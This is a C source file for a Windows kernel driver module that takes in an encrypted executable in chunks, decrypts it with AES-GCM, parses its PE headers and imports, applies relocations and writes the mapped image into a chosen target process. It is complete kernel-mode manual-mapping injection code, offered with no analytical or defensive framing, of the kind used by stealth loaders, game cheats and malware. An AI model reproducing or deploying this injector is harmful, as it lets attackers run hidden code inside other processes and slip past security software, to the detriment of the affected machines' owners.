#include "payload.h"
#include "aes_gcm.h"
#include "memory.h"
#include <ntimage.h>

#define POOL_TAG_PAYLOAD  'lpHR'
#define POOL_TAG_ENC      'ceHR'
#define POOL_TAG_DEC      'cdHR'
#define POOL_TAG_IMG      'biHR'
#define POOL_TAG_IMP      'piHR'
#define POOL_TAG_IAT      'aiHR'

NTKERNELAPI NTSTATUS NTAPI MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

typedef struct _RH_PAYLOAD {
    LIST_ENTRY Link;
    ULONGLONG  Id;
    UCHAR      SessionKey[RH_PAYLOAD_KEY_SIZE];

    PUCHAR     EncryptedBuf;
    ULONG      EncryptedSize;
    ULONG      EncryptedReceived;

    PUCHAR     ImageBuf;
    ULONG      SizeOfImage;
    ULONG      EntryPointRva;
    ULONGLONG  PreferredBase;
    ULONG      RelocDirRva;
    ULONG      RelocDirSize;

    PUCHAR     ImportBlob;
    ULONG      ImportBlobSize;
    ULONG      ImportCount;

    PVOID      IatEntries;
    ULONG      IatCount;

    BOOLEAN    Decrypted;
    BOOLEAN    Injected;
} RH_PAYLOAD, *PRH_PAYLOAD;

static LIST_ENTRY        g_payloadList;
static KGUARDED_MUTEX    g_payloadLock;
static ULONGLONG         g_nextId = 0x1000;
static BOOLEAN           g_initialized = FALSE;

NTSTATUS PayloadInit(VOID) {
    if (g_initialized) return STATUS_SUCCESS;
    InitializeListHead(&g_payloadList);
    KeInitializeGuardedMutex(&g_payloadLock);
    g_initialized = TRUE;
    return STATUS_SUCCESS;
}

static VOID FreePayloadLocked(PRH_PAYLOAD P) {
    if (P->EncryptedBuf) {
        RtlSecureZeroMemory(P->EncryptedBuf, P->EncryptedSize);
        ExFreePoolWithTag(P->EncryptedBuf, POOL_TAG_ENC);
        P->EncryptedBuf = NULL;
    }
    if (P->ImageBuf) {
        RtlSecureZeroMemory(P->ImageBuf, P->SizeOfImage);
        ExFreePoolWithTag(P->ImageBuf, POOL_TAG_IMG);
        P->ImageBuf = NULL;
    }
    if (P->ImportBlob) {
        ExFreePoolWithTag(P->ImportBlob, POOL_TAG_IMP);
        P->ImportBlob = NULL;
    }
    if (P->IatEntries) {
        ExFreePoolWithTag(P->IatEntries, POOL_TAG_IAT);
        P->IatEntries = NULL;
    }
    RtlSecureZeroMemory(P->SessionKey, sizeof(P->SessionKey));
    ExFreePoolWithTag(P, POOL_TAG_PAYLOAD);
}

VOID PayloadShutdown(VOID) {
    if (!g_initialized) return;
    KeAcquireGuardedMutex(&g_payloadLock);
    while (!IsListEmpty(&g_payloadList)) {
        PLIST_ENTRY entry = RemoveHeadList(&g_payloadList);
        PRH_PAYLOAD p = CONTAINING_RECORD(entry, RH_PAYLOAD, Link);
        FreePayloadLocked(p);
    }
    KeReleaseGuardedMutex(&g_payloadLock);
    g_initialized = FALSE;
}

static PRH_PAYLOAD FindPayloadLocked(ULONGLONG Id) {
    PLIST_ENTRY cur;
    for (cur = g_payloadList.Flink; cur != &g_payloadList; cur = cur->Flink) {
        PRH_PAYLOAD p = CONTAINING_RECORD(cur, RH_PAYLOAD, Link);
        if (p->Id == Id) return p;
    }
    return NULL;
}

NTSTATUS PayloadBegin(PPAYLOAD_BEGIN_REQUEST Request) {
    PRH_PAYLOAD p;

    if (!Request) return STATUS_INVALID_PARAMETER;
    if (Request->TotalEncryptedSize < (RH_PAYLOAD_IV_SIZE + RH_PAYLOAD_TAG_SIZE + 64)) return STATUS_INVALID_PARAMETER;
    if (Request->TotalEncryptedSize > RH_PAYLOAD_MAX_SIZE) return STATUS_INVALID_PARAMETER;

    p = (PRH_PAYLOAD)ExAllocatePoolWithTag(NonPagedPool, sizeof(RH_PAYLOAD), POOL_TAG_PAYLOAD);
    if (!p) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(p, sizeof(*p));

    p->EncryptedBuf = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, Request->TotalEncryptedSize, POOL_TAG_ENC);
    if (!p->EncryptedBuf) {
        ExFreePoolWithTag(p, POOL_TAG_PAYLOAD);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlCopyMemory(p->SessionKey, Request->SessionKey, RH_PAYLOAD_KEY_SIZE);
    p->EncryptedSize = (ULONG)Request->TotalEncryptedSize;
    p->EncryptedReceived = 0;
    p->Decrypted = FALSE;
    p->Injected = FALSE;

    KeAcquireGuardedMutex(&g_payloadLock);
    p->Id = ++g_nextId;
    InsertTailList(&g_payloadList, &p->Link);
    KeReleaseGuardedMutex(&g_payloadLock);

    Request->PayloadId = p->Id;

    DbgPrint("[RH][drv] PayloadBegin id=0x%llx encSize=%u\n", p->Id, p->EncryptedSize);
    return STATUS_SUCCESS;
}

NTSTATUS PayloadChunk(PVOID SystemBuffer, ULONG InputLength) {
    PPAYLOAD_CHUNK_REQUEST hdr;
    PUCHAR data;
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;

    if (!SystemBuffer) return STATUS_INVALID_PARAMETER;
    if (InputLength < sizeof(PAYLOAD_CHUNK_REQUEST)) return STATUS_INVALID_PARAMETER;

    hdr = (PPAYLOAD_CHUNK_REQUEST)SystemBuffer;
    if (hdr->ChunkSize == 0 || hdr->ChunkSize > RH_PAYLOAD_CHUNK_MAX) return STATUS_INVALID_PARAMETER;
    if ((ULONG)(sizeof(PAYLOAD_CHUNK_REQUEST) + hdr->ChunkSize) > InputLength) return STATUS_INVALID_PARAMETER;

    data = (PUCHAR)SystemBuffer + sizeof(PAYLOAD_CHUNK_REQUEST);

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(hdr->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (p->Decrypted) { status = STATUS_INVALID_DEVICE_STATE; goto done; }
    if (hdr->Offset + hdr->ChunkSize > p->EncryptedSize) { status = STATUS_INVALID_PARAMETER; goto done; }

    RtlCopyMemory(p->EncryptedBuf + hdr->Offset, data, hdr->ChunkSize);
    if (hdr->Offset + hdr->ChunkSize > p->EncryptedReceived) {
        p->EncryptedReceived = hdr->Offset + hdr->ChunkSize;
    }

done:
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

static NTSTATUS ParsePeAndExtract(PRH_PAYLOAD P, const UCHAR* PlainPe, ULONG PeSize) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS64 nt;
    PIMAGE_SECTION_HEADER sec;
    PIMAGE_DATA_DIRECTORY relocDir;
    PIMAGE_DATA_DIRECTORY impDir;
    USHORT i;
    ULONG sizeOfImage;
    ULONG sizeOfHeaders;

    if (PeSize < sizeof(IMAGE_DOS_HEADER)) return STATUS_INVALID_IMAGE_FORMAT;
    dos = (PIMAGE_DOS_HEADER)PlainPe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return STATUS_INVALID_IMAGE_FORMAT;
    if ((ULONG)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > PeSize) return STATUS_INVALID_IMAGE_FORMAT;

    nt = (PIMAGE_NT_HEADERS64)(PlainPe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return STATUS_INVALID_IMAGE_FORMAT;
    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return STATUS_INVALID_IMAGE_FORMAT;
    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) return STATUS_INVALID_IMAGE_FORMAT;

    sizeOfImage = nt->OptionalHeader.SizeOfImage;
    sizeOfHeaders = nt->OptionalHeader.SizeOfHeaders;
    if (sizeOfImage > RH_PAYLOAD_MAX_SIZE) return STATUS_INVALID_IMAGE_FORMAT;
    if (sizeOfHeaders > PeSize) return STATUS_INVALID_IMAGE_FORMAT;

    P->ImageBuf = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, sizeOfImage, POOL_TAG_IMG);
    if (!P->ImageBuf) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(P->ImageBuf, sizeOfImage);
    RtlCopyMemory(P->ImageBuf, PlainPe, sizeOfHeaders);

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].SizeOfRawData) {
            ULONG va = sec[i].VirtualAddress;
            ULONG raw = sec[i].PointerToRawData;
            ULONG rawSize = sec[i].SizeOfRawData;
            if (va + rawSize > sizeOfImage) continue;
            if (raw + rawSize > PeSize) continue;
            RtlCopyMemory(P->ImageBuf + va, PlainPe + raw, rawSize);
        }
    }

    P->SizeOfImage = sizeOfImage;
    P->EntryPointRva = nt->OptionalHeader.AddressOfEntryPoint;
    P->PreferredBase = nt->OptionalHeader.ImageBase;

    relocDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    P->RelocDirRva = relocDir->VirtualAddress;
    P->RelocDirSize = relocDir->Size;

    impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir->VirtualAddress && impDir->Size) {
        PIMAGE_IMPORT_DESCRIPTOR imp;
        ULONG totalEntries = 0;
        ULONG totalNamesSize = 0;
        ULONG impEnd = impDir->VirtualAddress + impDir->Size;
        if (impEnd > P->SizeOfImage) return STATUS_INVALID_IMAGE_FORMAT;

        imp = (PIMAGE_IMPORT_DESCRIPTOR)(P->ImageBuf + impDir->VirtualAddress);
        while ((PUCHAR)imp + sizeof(*imp) <= P->ImageBuf + impEnd && imp->Name) {
            const char* dllName = (const char*)(P->ImageBuf + imp->Name);
            ULONG dllLen = 0;
            ULONG thunkRva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
            PIMAGE_THUNK_DATA64 thunk;

            while (dllLen < 256 && dllName[dllLen]) ++dllLen;

            thunk = (PIMAGE_THUNK_DATA64)(P->ImageBuf + thunkRva);
            while ((PUCHAR)thunk + sizeof(*thunk) <= P->ImageBuf + P->SizeOfImage && thunk->u1.AddressOfData) {
                totalEntries++;
                totalNamesSize += dllLen + 1;

                if (IMAGE_SNAP_BY_ORDINAL64(thunk->u1.Ordinal)) {
                    totalNamesSize += 0;
                } else {
                    PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)(P->ImageBuf + thunk->u1.AddressOfData);
                    ULONG fnLen = 0;
                    while (fnLen < 256 && byName->Name[fnLen]) ++fnLen;
                    totalNamesSize += fnLen + 1;
                }
                ++thunk;
            }
            ++imp;
        }

        {
            ULONG blobSize = sizeof(ULONG) + totalEntries * sizeof(PAYLOAD_IMP_ENTRY) + totalNamesSize;
            PUCHAR blob;
            PUCHAR cursor;
            ULONG entryIdx = 0;

            if (blobSize > 64 * 1024) return STATUS_INVALID_IMAGE_FORMAT;

            blob = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, blobSize, POOL_TAG_IMP);
            if (!blob) return STATUS_INSUFFICIENT_RESOURCES;
            RtlZeroMemory(blob, blobSize);

            *(ULONG*)blob = totalEntries;
            cursor = blob + sizeof(ULONG) + totalEntries * sizeof(PAYLOAD_IMP_ENTRY);

            imp = (PIMAGE_IMPORT_DESCRIPTOR)(P->ImageBuf + impDir->VirtualAddress);
            while ((PUCHAR)imp + sizeof(*imp) <= P->ImageBuf + impEnd && imp->Name) {
                const char* dllName = (const char*)(P->ImageBuf + imp->Name);
                ULONG dllLen = 0;
                ULONG thunkRva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
                ULONG iatRvaBase = imp->FirstThunk;
                ULONG slot = 0;
                PIMAGE_THUNK_DATA64 thunk;

                while (dllLen < 256 && dllName[dllLen]) ++dllLen;
                thunk = (PIMAGE_THUNK_DATA64)(P->ImageBuf + thunkRva);

                while ((PUCHAR)thunk + sizeof(*thunk) <= P->ImageBuf + P->SizeOfImage && thunk->u1.AddressOfData) {
                    PPAYLOAD_IMP_ENTRY entry = (PPAYLOAD_IMP_ENTRY)(blob + sizeof(ULONG) + entryIdx * sizeof(PAYLOAD_IMP_ENTRY));
                    entry->IatRva = iatRvaBase + slot * (ULONG)sizeof(ULONGLONG);
                    entry->DllNameLen = (USHORT)dllLen;
                    RtlCopyMemory(cursor, dllName, dllLen);
                    cursor += dllLen;
                    *cursor++ = 0;

                    if (IMAGE_SNAP_BY_ORDINAL64(thunk->u1.Ordinal)) {
                        entry->Ordinal = (USHORT)(thunk->u1.Ordinal & 0xFFFF);
                        entry->FuncNameLen = 0;
                        entry->Flags = 1;
                    } else {
                        PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)(P->ImageBuf + thunk->u1.AddressOfData);
                        ULONG fnLen = 0;
                        while (fnLen < 256 && byName->Name[fnLen]) ++fnLen;
                        entry->FuncNameLen = (USHORT)fnLen;
                        entry->Ordinal = 0;
                        entry->Flags = 0;
                        RtlCopyMemory(cursor, byName->Name, fnLen);
                        cursor += fnLen;
                        *cursor++ = 0;
                    }

                    ++entryIdx;
                    ++slot;
                    ++thunk;
                }
                ++imp;
            }

            P->ImportBlob = blob;
            P->ImportBlobSize = blobSize;
            P->ImportCount = totalEntries;
        }
    } else {
        P->ImportBlob = NULL;
        P->ImportBlobSize = 0;
        P->ImportCount = 0;
    }

    return STATUS_SUCCESS;
}

NTSTATUS PayloadDecrypt(PPAYLOAD_ID_REQUEST Request) {
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;
    PUCHAR plain = NULL;
    ULONG ctLen;

    if (!Request) return STATUS_INVALID_PARAMETER;

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(Request->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (p->Decrypted) { status = STATUS_SUCCESS; goto done; }
    if (p->EncryptedReceived != p->EncryptedSize) { status = STATUS_INVALID_DEVICE_STATE; goto done; }
    if (p->EncryptedSize < RH_PAYLOAD_IV_SIZE + RH_PAYLOAD_TAG_SIZE) { status = STATUS_INVALID_PARAMETER; goto done; }

    ctLen = p->EncryptedSize - RH_PAYLOAD_IV_SIZE - RH_PAYLOAD_TAG_SIZE;
    plain = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, ctLen, POOL_TAG_DEC);
    if (!plain) { status = STATUS_INSUFFICIENT_RESOURCES; goto done; }

    status = AesGcmDecrypt(
        p->SessionKey,
        p->EncryptedBuf,
        NULL, 0,
        p->EncryptedBuf + RH_PAYLOAD_IV_SIZE + RH_PAYLOAD_TAG_SIZE, ctLen,
        p->EncryptedBuf + RH_PAYLOAD_IV_SIZE,
        plain);

    if (!NT_SUCCESS(status)) {
        DbgPrint("[RH][drv] PayloadDecrypt AesGcm failed 0x%08X id=0x%llx\n", status, p->Id);
        goto done;
    }

    status = ParsePeAndExtract(p, plain, ctLen);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[RH][drv] PayloadDecrypt PE parse failed 0x%08X id=0x%llx\n", status, p->Id);
        goto done;
    }

    p->Decrypted = TRUE;

    RtlSecureZeroMemory(p->EncryptedBuf, p->EncryptedSize);
    ExFreePoolWithTag(p->EncryptedBuf, POOL_TAG_ENC);
    p->EncryptedBuf = NULL;
    p->EncryptedSize = 0;
    RtlSecureZeroMemory(p->SessionKey, sizeof(p->SessionKey));

    DbgPrint("[RH][drv] PayloadDecrypt OK id=0x%llx imageSize=%u entry=0x%X imports=%u\n",
             p->Id, p->SizeOfImage, p->EntryPointRva, p->ImportCount);

done:
    if (plain) {
        RtlSecureZeroMemory(plain, ctLen);
        ExFreePoolWithTag(plain, POOL_TAG_DEC);
    }
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

NTSTATUS PayloadGetMeta(PPAYLOAD_META_REQUEST Request) {
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;

    if (!Request) return STATUS_INVALID_PARAMETER;

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(Request->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (!p->Decrypted) { status = STATUS_INVALID_DEVICE_STATE; goto done; }

    Request->SizeOfImage = p->SizeOfImage;
    Request->EntryPointRva = p->EntryPointRva;
    Request->PreferredBase = p->PreferredBase;
    Request->ImportCount = p->ImportCount;
    Request->ImportBlobSize = p->ImportBlobSize;
    Request->RelocationCount = p->RelocDirSize;

done:
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

NTSTATUS PayloadGetImports(PPAYLOAD_IMP_REQUEST Request, PVOID OutputBuffer, ULONG OutputLength, PULONG BytesReturned) {
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG required;

    if (!Request || !OutputBuffer || !BytesReturned) return STATUS_INVALID_PARAMETER;
    *BytesReturned = 0;

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(Request->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (!p->Decrypted) { status = STATUS_INVALID_DEVICE_STATE; goto done; }

    required = sizeof(PAYLOAD_IMP_REQUEST) + p->ImportBlobSize;
    if (OutputLength < required) {
        Request->BytesWritten = p->ImportBlobSize;
        status = STATUS_BUFFER_TOO_SMALL;
        *BytesReturned = sizeof(PAYLOAD_IMP_REQUEST);
        goto done;
    }

    Request->BytesWritten = p->ImportBlobSize;
    if (p->ImportBlob && p->ImportBlobSize) {
        RtlCopyMemory((PUCHAR)OutputBuffer + sizeof(PAYLOAD_IMP_REQUEST), p->ImportBlob, p->ImportBlobSize);
    }
    *BytesReturned = required;

done:
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

NTSTATUS PayloadSetIat(PVOID SystemBuffer, ULONG InputLength) {
    PPAYLOAD_SET_IAT_REQUEST hdr;
    PPAYLOAD_IAT_ENTRY entries;
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;
    ULONG i;

    if (!SystemBuffer) return STATUS_INVALID_PARAMETER;
    if (InputLength < sizeof(PAYLOAD_SET_IAT_REQUEST)) return STATUS_INVALID_PARAMETER;

    hdr = (PPAYLOAD_SET_IAT_REQUEST)SystemBuffer;
    if (hdr->EntryCount > 4096) return STATUS_INVALID_PARAMETER;
    if ((ULONG)(sizeof(PAYLOAD_SET_IAT_REQUEST) + hdr->EntryCount * sizeof(PAYLOAD_IAT_ENTRY)) > InputLength) {
        return STATUS_INVALID_PARAMETER;
    }

    entries = (PPAYLOAD_IAT_ENTRY)((PUCHAR)SystemBuffer + sizeof(PAYLOAD_SET_IAT_REQUEST));

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(hdr->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (!p->Decrypted) { status = STATUS_INVALID_DEVICE_STATE; goto done; }
    if (!p->ImageBuf) { status = STATUS_INVALID_DEVICE_STATE; goto done; }

    for (i = 0; i < hdr->EntryCount; ++i) {
        if (entries[i].IatRva + sizeof(ULONGLONG) > p->SizeOfImage) {
            status = STATUS_INVALID_PARAMETER;
            goto done;
        }
        *(ULONGLONG*)(p->ImageBuf + entries[i].IatRva) = entries[i].ResolvedAddress;
    }

done:
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

static VOID ApplyRelocations(PRH_PAYLOAD P, ULONGLONG TargetBase) {
    LONGLONG delta;
    PIMAGE_BASE_RELOCATION reloc;
    ULONG parsed = 0;

    if (!P->RelocDirSize || !P->RelocDirRva) return;
    delta = (LONGLONG)(TargetBase - P->PreferredBase);
    if (delta == 0) return;
    if (P->RelocDirRva + P->RelocDirSize > P->SizeOfImage) return;

    reloc = (PIMAGE_BASE_RELOCATION)(P->ImageBuf + P->RelocDirRva);
    while (parsed < P->RelocDirSize && reloc->SizeOfBlock) {
        ULONG count;
        USHORT* list;
        ULONG j;

        if (reloc->SizeOfBlock < sizeof(IMAGE_BASE_RELOCATION)) break;
        count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        list = (USHORT*)((PUCHAR)reloc + sizeof(IMAGE_BASE_RELOCATION));

        for (j = 0; j < count; ++j) {
            USHORT type = (USHORT)(list[j] >> 12);
            USHORT off = (USHORT)(list[j] & 0xFFF);
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONG fixup = reloc->VirtualAddress + off;
                if (fixup + sizeof(ULONGLONG) <= P->SizeOfImage) {
                    *(ULONGLONG*)(P->ImageBuf + fixup) += delta;
                }
            }
        }
        parsed += reloc->SizeOfBlock;
        reloc = (PIMAGE_BASE_RELOCATION)((PUCHAR)reloc + reloc->SizeOfBlock);
    }
}

NTSTATUS PayloadInject(PPAYLOAD_INJECT_REQUEST Request) {
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS targetProc = NULL;
    SIZE_T written = 0;

    if (!Request) return STATUS_INVALID_PARAMETER;
    if (!Request->TargetBase) return STATUS_INVALID_PARAMETER;

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(Request->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    if (!p->Decrypted || !p->ImageBuf) { status = STATUS_INVALID_DEVICE_STATE; goto done; }
    if (p->Injected) { status = STATUS_INVALID_DEVICE_STATE; goto done; }

    ApplyRelocations(p, Request->TargetBase);

    status = PsLookupProcessByProcessId(Request->TargetPid, &targetProc);
    if (!NT_SUCCESS(status)) goto done;

    status = MmCopyVirtualMemory(
        PsGetCurrentProcess(),
        p->ImageBuf,
        targetProc,
        (PVOID)Request->TargetBase,
        p->SizeOfImage,
        KernelMode,
        &written);

    if (!NT_SUCCESS(status) || written != p->SizeOfImage) {
        DbgPrint("[RH][drv] PayloadInject MmCopy direct failed 0x%08X out=%zu/%u, falling back\n",
                 status, written, p->SizeOfImage);
        status = WriteProcessMemory(Request->TargetPid, p->ImageBuf, (PVOID)Request->TargetBase, p->SizeOfImage, &written);
    }

    if (NT_SUCCESS(status) && written == p->SizeOfImage) {
        p->Injected = TRUE;
        RtlSecureZeroMemory(p->ImageBuf, p->SizeOfImage);
        ExFreePoolWithTag(p->ImageBuf, POOL_TAG_IMG);
        p->ImageBuf = NULL;
        DbgPrint("[RH][drv] PayloadInject OK id=0x%llx pid=%p base=0x%llx size=%zu\n",
                 p->Id, Request->TargetPid, Request->TargetBase, written);
    } else {
        DbgPrint("[RH][drv] PayloadInject FAIL 0x%08X out=%zu/%u\n", status, written, p->SizeOfImage);
        if (NT_SUCCESS(status)) status = STATUS_PARTIAL_COPY;
    }

done:
    if (targetProc) ObDereferenceObject(targetProc);
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}

NTSTATUS PayloadRelease(PPAYLOAD_ID_REQUEST Request) {
    PRH_PAYLOAD p;
    NTSTATUS status = STATUS_SUCCESS;

    if (!Request) return STATUS_INVALID_PARAMETER;

    KeAcquireGuardedMutex(&g_payloadLock);
    p = FindPayloadLocked(Request->PayloadId);
    if (!p) { status = STATUS_NOT_FOUND; goto done; }
    RemoveEntryList(&p->Link);
    FreePayloadLocked(p);

done:
    KeReleaseGuardedMutex(&g_payloadLock);
    return status;
}
